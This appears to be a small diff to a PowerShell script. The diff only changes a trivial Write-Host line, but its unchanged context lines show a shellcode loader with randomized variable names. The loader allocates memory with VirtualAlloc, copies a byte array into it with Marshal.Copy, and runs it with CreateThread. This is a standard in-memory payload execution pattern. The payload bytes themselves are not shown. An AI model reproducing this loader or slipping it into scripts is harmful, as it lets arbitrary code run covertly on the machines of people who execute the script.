@@ -15,4 +15,4 @@ $SlbfvEtcIHmRq = $azLGeJipW::VirtualAlloc(0,[Math]::Max($HRSVxduVu.Length,0x1000
 [System.Runtime.InteropServices.Marshal]::Copy($HRSVxduVu,0,$SlbfvEtcIHmRq,$HRSVxduVu.Length)
 
 $azLGeJipW::CreateThread(0,0,$SlbfvEtcIHmRq,0,0,0)
-Write-Host '1' > C:\temp\test.txt
+Write-Host '2' > C:\temp\test.txt
